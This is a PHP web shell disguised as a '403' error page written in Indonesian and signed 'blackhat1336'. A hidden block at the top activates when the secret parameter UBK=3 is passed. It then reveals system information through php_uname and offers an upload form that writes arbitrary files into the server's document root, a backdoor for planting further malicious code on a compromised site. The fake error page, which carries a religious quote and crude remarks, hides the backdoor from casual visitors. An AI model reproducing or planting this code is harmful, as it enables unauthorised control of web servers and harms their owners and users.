<?php if($_GET['UBK'] == '3') { echo "<b>".php_uname()."</b><br>"; echo "<form method='post' enctype='multipart/form-data'> 	 <input type='file' name='idx_file'> 	 <input type='submit' name='upload' value='upload'> 	 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) { 	if(is_writable($root)) { 		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { 			$web = "http://".$_SERVER['HTTP_HOST']."/"; 			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>"; 		} else { 			echo "gagal upload di document root."; 		} 	} else { 		if(@copy($_FILES['idx_file']['tmp_name'], $files)) { 			echo "sukses tusbol <b>$files</b> di folder ini"; 		} else { 			echo "gagal upload gagal ngentod !"; 		} 	} } } ?>

<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title> 403 INGAT DOSA
</title></head>
<body style="color:#6E6E6E; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #424242;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
<h2 style="margin-top:20px;font-size: 30px;">Dosa Mas :)
</h2>
<p>Gak Usah Iseng Deh Mas Dosa Tau, Heker ya ?<br>
"Barangsiapa yang membawa mudarat<br>maka Allah akan memudartkan dirinya sendiri<br>sesiapa yang menyusahkan orang lain<br>Allah akan menyuasahkannya pula"<br>
(Riwayat Abu Daud, no 3635)<br>
	<br>blackhat1336

</p>
</div></div></body></html>
